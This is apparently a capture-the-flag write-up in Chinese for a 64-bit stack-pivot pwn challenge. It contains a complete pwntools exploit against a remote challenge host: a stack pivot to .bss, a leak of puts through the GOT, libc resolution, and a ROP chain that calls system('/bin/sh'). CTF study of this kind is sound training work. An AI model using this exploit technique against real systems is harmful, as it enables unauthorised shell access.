# W3 stack migration revenge

## 文件分析

下载`pwn`, NX on, PIE off, Canary off, RELRO full  
ghidra分析为64位程序
~~怎么这次都是-2.zip~~

## 逆向

程序很简单，但是拿不到栈地址，怎么办？  
迁移到bss上后，地址就可控了，回到了上次的栈迁移

## EXPLOIT

```python
from pwn import *
sh = remote('node4.buuoj.cn', 25597)
elf = ELF('stackm')
bss = 0x404800
read = 0x4011ff # read to bss - 0x50

# payload 1, stack pivot to bss
sh.send(b'0'*0x50 + p64(bss) + p64(read))

sh.recvuntil(b'ny\n') #skip
putsGot = elf.got['puts']
putsPlt = elf.plt['puts']
vulnAddr = 0x4011db
popRdiAddr = 0x4012b3
retAddr = 0x401228
leaveRetAddr = 0x401227

# payload 2, stack pivot to popRdi
sh.send(p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(vulnAddr) + b'0'*0x30 + p64(bss - 0x58) + p64(leaveRetAddr))

sh.recvuntil(b'ny\n') # skip
putsGotAddr = u64(sh.recvline()[:6] + b'\0\0')
libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump('puts')
systemAddr = libcBase + libc.dump('system')
shstrAddr = libcBase + libc.dump('str_bin_sh')

# payload 3
sh.send(p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr) + b'0'*0x30 + p64(bss - 0x90) + p64(leaveRetAddr))

sh.interactive()
```

Done.
